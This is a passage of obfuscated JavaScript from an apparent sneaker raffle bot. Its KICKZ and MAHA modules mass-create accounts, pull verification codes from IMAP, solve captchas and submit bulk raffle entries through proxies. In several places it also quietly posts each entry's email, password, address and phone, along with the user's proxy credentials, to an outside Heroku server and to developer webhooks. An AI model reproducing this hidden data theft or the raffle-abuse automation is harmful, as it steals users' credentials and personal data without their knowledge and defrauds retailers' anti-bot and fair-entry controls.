                                                        console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x41cf5d['end']();
                                                    else {
                                                        var _0x2879e9 = _0x41cf5d['seq']['fetch'](_0x5e6f43, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x2879e9['on']('message', function (_0x4e90e3, _0x5d96c9) {
                                                            var _0x3f0804 = '(#' + _0x5d96c9 + ')\x20';
                                                            _0x4e90e3['on']('body', function (_0x401d8c, _0x28b3b8) {
                                                                _0x1560b8(_0x401d8c, (_0x36fad3, _0x4e075c) => {
                                                                    if (_0x4e075c['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x232011 = _0x4e075c['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x4e31d5 = _0x232011[0x1]['split']('<')[0x0];
                                                                        _0xe7e58f = _0x4e31d5;
                                                                    }
                                                                });
                                                            }), _0x4e90e3['once']('end', function () {
                                                            });
                                                        }), _0x2879e9['once']('error', function (_0x2c452d) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x2879e9['once']('end', function () {
                                                            _0x41cf5d['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x41cf5d['once']('error', function (_0x1b735d) {
                                            console['log'](_0x31f5da['red'](_0x1b735d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x47bffa = !![];
                                        }), _0x41cf5d['once']('end', async function () {
                                        }), _0x41cf5d['connect']();
                                    }
                                    _0x2ad044(), await _0x1e21d2(0x1388);
                                    if (_0xe7e58f)
                                        return _0xe7e58f;
                                    if (_0x47bffa)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x6ef19d == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x346359(), _0x1e21d2(0x320), console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Verifying..'), await _0x39eaba['type']('#verificationCode', code), await _0x1e21d2(0x1f4), await _0x39eaba['click']('#buttonVerify'), await _0x1e21d2(0x190), await _0x39eaba['click']('#buttonVerify'), await _0x1e21d2(0x3e8);
                            try {
                                await _0x39eaba['waitForSelector']('div.b-user_greeting'), _0x2c4a38 = 'no', console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Account\x20' + _0x4bf71b[_0x4bc8f2]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x534d99['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x4bf71b[_0x4bc8f2]['Email'] + ',' + _0x4bf71b[_0x4bc8f2]['Password'] + ','), console['log'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Account\x20' + _0x4bf71b[_0x4bc8f2]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x10cfae['succesDEVMSG']);
                                } catch {
                                }
                                await _0xa0452b(_0x46ec81, _0x10cfae['succesDEVMSG']);
                            } catch {
                                _0x2c4a38 = 'no', console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x923b70) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20' + _0x923b70)), _0x286eae[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x286eae[0x0]['description'] = '' + _0x923b70, await _0xa0452b(_0x5522d1, _0x4d8170), _0x2c4a38 = 'yes';
                        } finally {
                            _0x2c8466 && _0x2c8466['close']();
                            if (_0x2c4a38 == 'yes' && _0x1230d5 != 0x5) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x47de3e['name'] + ']\x20Task\x20' + (_0x4bc8f2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1230d5 + '\x20/\x205)')), _0x4bc8f2 = _0x4bc8f2 - 0x1, _0x1230d5 = _0x1230d5 + 0x1;
                                continue;
                            }
                            _0x2c4a38 == 'yes' && _0x1230d5 >= 0x5 && (_0x456859(_0x4bf71b[_0x4bc8f2], _0x47de3e), _0x2c4a38 = 'no', _0x1230d5 = 0x0), console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x5f3cdb, _0x6d6618, _0x2aacab) {
                    _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4558f2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x174afd = 0x0; _0x174afd < _0x6d6618['length']; _0x174afd++) {
                        var _0x111e90;
                        if (_0x1b17f5 != 'yes')
                            var _0x1b17f5 = '', _0x379c13 = 0x0;
                        _0x4a5c1f(_0x5f3cdb['name'] + '\x20Task\x20' + (_0x174afd + 0x1) + '\x20/\x20' + _0x6d6618['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                        var _0x130a33 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xf4f7bc
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x6d6618[_0x174afd]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x6d6618[_0x174afd]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4558f2['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2bc61f
                                }
                            ]
                        }];
                        let _0x250a0d = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x57e098 = ![];
                        for (key of _0x250a0d) {
                            if (_0x6d6618[_0x174afd][key] == '' || !_0x6d6618[_0x174afd][key]) {
                                console['log'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x57e098 = !![];
                                break;
                            }
                        }
                        if (_0x57e098) {
                            await _0x1e21d2(0x1f4);
                            continue;
                        }
                        var _0x14f410 = await _0x3d56af(_0x6d6618[_0x174afd], _0x5f3cdb, 'dev', ![]), _0x1e001e = await _0x3d56af(_0x6d6618[_0x174afd], _0x5f3cdb, 'pub', ![]);
                        const _0x5261fd = {
                            'succesDEVMSG': { 'embeds': [_0x14f410] },
                            'succesPUBMSG': { 'embeds': [_0x1e001e] }
                        };
                        try {
                            await _0x437e8(_0x6d6618, _0x174afd);
                        } catch {
                            _0x1b17f5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x4558f2['useRandomProxy'] = ![])
                            var _0x6282db = _0x2aacab[_0x174afd]['split'](':');
                        else
                            var _0x2e7c3b = Math['round'](Math['random']() * (_0x2aacab['length'] - 0x1)), _0x6282db = _0x2aacab[_0x2e7c3b]['split'](':');
                        var _0x244673;
                        try {
                            _0x244673 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x6282db[0x0] + ':' + _0x6282db[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x244673 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x6282db[0x0] + ':' + _0x6282db[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4a4632 = await _0x244673['newPage']();
                            await _0x4a4632['authenticate']({
                                'username': '' + _0x6282db[0x2],
                                'password': '' + _0x6282db[0x3]
                            }), console['log'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a4632['setRequestInterception'](!![]), _0x4a4632['on']('request', _0x3ddb99 => {
                                _0x3ddb99['resourceType']() === 'image' || _0x3ddb99['resourceType']() === 'font' || _0x3ddb99['resourceType']() === 'media' ? _0x3ddb99['abort']() : _0x3ddb99['continue']();
                            }), await _0x4a4632['goto']('' + _0x6d6618[_0x174afd]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x1e21d2(0x12c), await _0x4a4632['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4a4632['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1e21d2(0x7d0);
                            try {
                                await _0x4a4632['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x4a4632['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Logging\x20in'), await _0x4a4632['waitForSelector']('#username'), await _0x4a4632['type']('#username', _0x6d6618[_0x174afd]['Email']), await _0x4a4632['waitForSelector']('#password'), await _0x4a4632['type']('#password', _0x6d6618[_0x174afd]['Password']), await _0x1e21d2(0x190), await _0x4a4632['click']('#buttonSubmit'), await _0x4a4632['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Getting\x20Product'), await _0x1e21d2(0x1f4), console['log'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x6d6618[_0x174afd]['Size']);
                            let _0x4126ff = _0x6d6618[_0x174afd]['Size']['replace']('.5', '\x201/2');
                            if (_0x4126ff['toUpperCase']() == 'RANDOM') {
                                const _0x3f26e3 = await _0x4a4632['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x7cf431 = Math['round'](Math['random']() * (_0x3f26e3['length'] - 0x1));
                                await _0x3f26e3[_0x7cf431]['click']();
                            } else
                                await _0x4a4632['click']('button[aria-label=\x22' + _0x4126ff + '\x22]');
                            await _0x1e21d2(0x1f4);
                            try {
                                await _0x4a4632['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x1e21d2(0x12c), console['log'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4a4632['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x1e21d2(0x12c), await _0x4a4632['type']('#dwfrm_raffle_addressFields_firstName', _0x6d6618[_0x174afd]['FirstName']), await _0x1e21d2(0x12c), await _0x4a4632['type']('#dwfrm_raffle_addressFields_lastName', _0x6d6618[_0x174afd]['LastName']), await _0x1e21d2(0x12c), await _0x4a4632['select']('#dwfrm_raffle_addressFields_country', _0x6d6618[_0x174afd]['Country']), await _0x1e21d2(0x12c), await _0x4a4632['type']('#dwfrm_raffle_addressFields_city', _0x6d6618[_0x174afd]['City']), await _0x1e21d2(0x12c);
                            _0x6d6618[_0x174afd]['Postcode'] == undefined && (_0x6d6618[_0x174afd]['Postcode'] = _0x6d6618[_0x174afd]['Zip']);
                            await _0x4a4632['type']('#dwfrm_raffle_addressFields_postalCode', _0x6d6618[_0x174afd]['Postcode']), await _0x1e21d2(0x12c), await _0x4a4632['type']('#dwfrm_raffle_addressFields_address1', _0x6d6618[_0x174afd]['Address1']), await _0x1e21d2(0x12c), await _0x4a4632['type']('#dwfrm_raffle_addressFields_address2', _0x6d6618[_0x174afd]['HouseNumber']), await _0x1e21d2(0x12c), await _0x4a4632['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x6d6618[_0x174afd]['Address2']), await _0x1e21d2(0x12c), await _0x4a4632['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x1e21d2(0x12c), await _0x4a4632['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x6d6618[_0x174afd]['Follower']), await _0x1e21d2(0x1f4), await _0x4a4632['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x1e21d2(0x1f4), console['log'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20' + _0x31f5da['blue']('Awaiting\x20Paypal\x20Payment')), await _0x4a4632['click']('.b-paypal_button');
                            try {
                                await _0x4a4632['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x1b17f5 = 'no', _0x406375(_0x6d6618[_0x174afd], _0x5f3cdb), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x5261fd['succesDEVMSG']);
                                await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x5261fd['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x28ff05, _0x5261fd['succesPUBMSG']);
                                let _0x547bbe = _0x6d6618[_0x174afd];
                                try {
                                    prxdata = {
                                        'username': _0xf4f7bc['replace']('#', ''),
                                        'module': _0x5f3cdb['name'],
                                        'entrydata': JSON['stringify'](_0x547bbe),
                                        'proxy': '' + _0x2aacab[_0x174afd]
                                    };
                                    var _0x2e6387 = JSON['stringify'](prxdata);
                                    let _0x327b43 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x2e6387, _0x327b43);
                                } catch (_0x2faf02) {
                                }
                            } catch (_0x4f6edf) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4f6edf)), _0x111e90 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4f6edf;
                                var _0x519917 = await _0x3d56af(_0x6d6618[_0x174afd], _0x5f3cdb, 'dev', !![], _0x111e90);
                                _0x5261fd['errorDEV'] = { 'embeds': [_0x519917] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x5261fd['errorDEV']), await _0xa0452b(_0x5522d1, _0x5261fd['errorDEV']);
                            }
                        } catch (_0x54a661) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20' + _0x54a661)), _0x111e90 = '' + _0x54a661;
                            var _0x519917 = await _0x3d56af(_0x6d6618[_0x174afd], _0x5f3cdb, 'dev', !![], _0x111e90);
                            _0x5261fd['errorDEV'] = { 'embeds': [_0x519917] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x5261fd['errorDEV']), await _0xa0452b(_0x5522d1, _0x5261fd['errorDEV']), _0x1b17f5 = 'yes';
                        } finally {
                            _0x244673 && _0x244673['close']();
                            if (_0x1b17f5 == 'yes' && _0x379c13 != 0x5) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5f3cdb['name'] + ']\x20Task\x20' + (_0x174afd + 0x1) + '\x20:\x20Retrying\x20(' + _0x379c13 + '\x20/\x205)')), _0x174afd = _0x174afd - 0x1, _0x379c13 = _0x379c13 + 0x1;
                                continue;
                            }
                            _0x1b17f5 == 'yes' && _0x379c13 >= 0x5 && (_0x456859(_0x6d6618[_0x174afd], _0x5f3cdb), _0x1b17f5 = 'no', _0x379c13 = 0x0), console['log']('Waiting\x20for\x20' + _0x4558f2['AfewDelay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xb70390, _0x206186, _0x1c5630) {
                    for (var _0x302a29 = 0x0; _0x302a29 < _0x206186['length']; _0x302a29++) {
                        try {
                            await _0x437e8(_0x206186, _0x302a29);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x184193(_0x296d8e, _0x362cad, _0x1ce7f6, _0x11bf17, _0x422663) {
                            var _0x5639bf, _0x1300da = {}, _0x353807 = [], _0x42f1d7 = {}, _0x38d641 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0xfe4991 = Math['round'](Math['random']() * (_0x38d641['length'] - 0x1));
                            !_0x11bf17 && (_0x11bf17 = {});
                            if (_0x362cad != 'ver') {
                                _0x4a5c1f(_0x1ce7f6['name'] + '\x20Task\x20' + (_0x296d8e + 0x1) + '\x20/\x20' + _0x11bf17['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40), await _0x437e8(_0x11bf17, _0x296d8e), _0x1300da = _0x1ce7f6['data'], _0x1300da['data']['attributes']['email'] = '' + _0x11bf17[_0x296d8e]['Email'];
                                if (_0x11bf17[_0x296d8e]['Size'] == 'RANDOM') {
                                }
                                _0x1300da['data']['attributes']['properties']['$first_name'] = '' + _0x11bf17[_0x296d8e]['FirstName'], _0x1300da['data']['attributes']['properties']['$last_name'] = '' + _0x11bf17[_0x296d8e]['LastName'], _0x1300da['data']['attributes']['properties']['$address1'] = _0x11bf17[_0x296d8e]['Address1'] + '\x20' + _0x11bf17[_0x296d8e]['Address2'] + '\x20' + _0x11bf17[_0x296d8e]['HouseNumber'], _0x1300da['data']['attributes']['properties']['$zip'] = '' + _0x11bf17[_0x296d8e]['Zip'], _0x1300da['data']['attributes']['properties']['$city'] = '' + _0x11bf17[_0x296d8e]['City'], _0x1300da['data']['attributes']['properties']['$country'] = '' + _0x11bf17[_0x296d8e]['Country'], _0x11bf17[_0x296d8e]['Size'] == 'RANDOM' ? _0x1300da['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x38d641[_0xfe4991] : _0x1300da['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x11bf17[_0x296d8e]['Size'], _0x1300da['data']['attributes']['properties']['$phone_number'] = '' + _0x11bf17[_0x296d8e]['Phone'], _0x1300da['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x11bf17[_0x296d8e]['Follower'];
                            }
                            if (_0x4558f2['useRandomProxy'] = ![])
                                var _0x1cab95 = _0x422663[_0x296d8e]['split'](':');
                            else
                                var _0x2bf061 = Math['round'](Math['random']() * (_0x422663['length'] - 0x1)), _0x1cab95 = _0x422663[_0x2bf061]['split'](':');
                            var _0x21fe33 = {
                                'jar': _0x149879,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x1ce7f6['url'],
                                'headers': _0x1ce7f6['headers'],
                                'body': JSON['stringify'](_0x1300da),
                                'proxy': 'http://' + _0x1cab95[0x2] + ':' + _0x1cab95[0x3] + '@' + _0x1cab95[0x0] + ':' + _0x1cab95[0x1]
                            };
                            return _0x362cad != 'ver' && (_0x21fe33['url'] = _0x1ce7f6['url'], _0x21fe33['headers'] = _0x1ce7f6['headers']), _0x362cad == 'ver' && (_0x21fe33['method'] = 'GET'), new Promise(function (_0x7b4f6a, _0x4e1292) {
                                callback = async (_0x4ae3ee, _0x259e3f, _0x138aa5) => {
                                    if (!_0x4ae3ee && _0x259e3f['statusCode'] == 0xca || !_0x4ae3ee && _0x259e3f['statusCode'] == 0xc8) {
                                        if (_0x362cad != 'ver') {
                                            var _0x33ade7 = await _0x3d56af(_0x11bf17[_0x296d8e], _0x1ce7f6, 'dev', ![]), _0x30009d = await _0x3d56af(_0x11bf17[_0x296d8e], _0x1ce7f6, 'pub', ![]);
                                            const _0x558fe4 = {
                                                'succesDEVMSG': { 'embeds': [_0x33ade7] },
                                                'succesPUBMSG': { 'embeds': [_0x30009d] }
                                            };
                                            let _0x1da04d = _0x11bf17[_0x296d8e];
                                            try {
                                                prxdata = {
                                                    'username': _0xf4f7bc['replace']('#', ''),
                                                    'module': _0x1ce7f6['name'],
                                                    'entrydata': JSON['stringify'](_0x1da04d),
                                                    'proxy': '' + _0x422663[_0x296d8e]
                                                };
                                                var _0x5b8b6e = JSON['stringify'](prxdata);
                                                let _0x536fc2 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x5b8b6e, _0x536fc2);
                                            } catch (_0xcd0e51) {
                                            }
                                            if (_0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '')
                                                try {
                                                    await _0xa0452b(_0x4558f2['webhook'], _0x558fe4['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x558fe4['succesDEVMSG']), await _0x1e21d2(0xc8);
                                            try {
                                                await _0xa0452b(_0x28ff05, _0x558fe4['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x406375(_0x11bf17[_0x296d8e], _0x1ce7f6);
                                        }
                                        _0x7b4f6a(console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x1ce7f6['name'] + ']\x20Task\x20' + (_0x296d8e + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x362cad != 'ver') {
                                            var _0x4d44f3 = '' + _0x4ae3ee, _0x4a28b1 = await _0x3d56af(_0x11bf17[_0x296d8e], _0x1ce7f6, 'dev', !![], _0x4d44f3), _0x31a23a = {};
                                            _0x31a23a['errorDEV'] = { 'embeds': [_0x4a28b1] }, _0x456859(_0x11bf17[_0x296d8e], _0x1ce7f6), _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x31a23a['errorDEV']), await _0xa0452b(_0x5522d1, _0x31a23a['errorDEV']);
                                        }
                                        _0x4e1292(console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x1ce7f6['name'] + ']\x20Task\x20' + (_0x296d8e + 0x1) + ':\x20' + _0x4ae3ee)));
                                    }
                                };
                                try {
                                    _0x362cad != 'ver' && console['log'](_0x1a8584() + '\x20[' + _0x1ce7f6['name'] + ']\x20Task\x20' + (_0x296d8e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1300da['data']['attributes']['email']), _0x33a47f(_0x21fe33, callback);
                                } catch (_0x4288c2) {
                                    console['log'](_0x1a8584() + '\x20Task\x20' + (_0x296d8e + 0x1) + ':\x20' + _0x4288c2);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x184193(_0x302a29, 'nor', _0xb70390, _0x206186, _0x1c5630), console['log'](_0x1a8584() + '\x20[' + _0xb70390['name'] + ']\x20Sleeping\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                        } catch (_0x5660ff) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2a8657, _0x28e6e5, _0x116c1b) {
                    var _0x1aa3ea = [], _0x363250 = ![];
                    async function _0x19af6b() {
                        var _0x3e271f = new _0x48412a({
                            'user': _0x4558f2['masterMail'],
                            'password': _0x4558f2['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4e9142(_0x5f4bc8) {
                            _0x3e271f['openBox']('INBOX', ![], _0x5f4bc8);
                        }
                        _0x3e271f['once']('ready', function () {
                            _0x4e9142(function (_0x13db84, _0x19c4bf) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x13db84)
                                    throw _0x13db84;
                                _0x3e271f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x73f8ba, _0x466396) {
                                    if (!_0x466396 || !_0x466396['length'])
                                        console['log'](_0x1a8584() + '\x20[' + _0x2a8657['name'] + ']\x20No\x20mails\x20found'), _0x3e271f['end']();
